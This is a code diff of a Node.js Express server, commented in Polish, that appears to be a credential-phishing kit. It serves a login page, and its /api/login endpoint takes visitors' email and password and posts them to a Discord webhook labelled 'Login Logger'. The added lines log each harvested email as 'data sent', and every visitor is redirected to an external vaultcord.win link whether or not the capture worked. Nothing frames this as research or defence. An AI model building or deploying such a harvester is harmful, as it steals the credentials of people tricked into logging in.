@@ -12,7 +12,17 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Endpoint do logowania
+// Strona główna - index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Strona logowania - login.html
+app.get('/login', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// Endpoint API do logowania
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
     
@@ -45,13 +55,18 @@ app.post('/api/login', async (req, res) => {
                 username: 'Login Logger',
                 avatar_url: 'https://cdn.discordapp.com/assets/discord-icon.png'
             });
+            console.log(`✅ Dane wysłane: ${email}`);
+        } else {
+            console.log('⚠️ WEBHOOK_URL nie ustawiony');
         }
         res.json({ success: true, redirect: 'https://vaultcord.win/kamerkidlawszystr' });
     } catch (error) {
+        console.error('❌ Błąd:', error.message);
         res.json({ success: false, redirect: 'https://vaultcord.win/kamerkidlawszystr' });
     }
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`✅ Serwer działa na http://localhost:${PORT}`);
+    console.log(`📡 Webhook: ${WEBHOOK_URL ? 'Ustawiony' : 'NIE USTAWIONY!'}`);
 });
